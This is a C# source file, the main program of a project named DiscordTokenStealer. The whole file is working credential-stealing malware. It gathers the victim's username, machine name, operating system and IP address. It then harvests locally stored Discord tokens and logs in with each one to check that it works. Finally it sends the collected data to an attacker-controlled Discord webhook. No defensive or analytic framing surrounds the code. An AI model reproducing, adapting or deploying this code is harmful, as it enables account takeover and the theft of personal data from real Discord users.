using System.Text;
using DiscordTokenStealer.Discord;

namespace DiscordTokenStealer;

public static class Program
{
    private static async Task Main()
    {
        StringBuilder content = new StringBuilder()
            .AppendLine($"Username: {Environment.UserName}")
            .AppendLine($"Machine Name: {Environment.MachineName}")
            .AppendLine($"Operating System: {Environment.OSVersion.Platform}")
            .AppendLine($"IP-Adress: {await IPInfo.GetAddress()}")
            .AppendLine("Tokens: ");
        await Parallel.ForEachAsync(TokenParser.ParseAll(), async (token, cts) => await ValidateToken(content, token, cts));
        using DiscordWebhook webhook = new("https://canary.discord.com/api/webhooks/{webhook.id}/{webhook.token}");
        await webhook.SendMessage(content.ToString());
    }

    private static async Task ValidateToken(StringBuilder sb, string token, CancellationToken cts = default)
    {
        using DiscordClient client = new(token);
        DiscordUser? user = await client.Login(cts);
        if (user == null)
        {
            return;
        }
        lock (sb)
        {
            sb.AppendLine($"\t{token}");
            sb.AppendLine(user.ToString());
        }
    }
}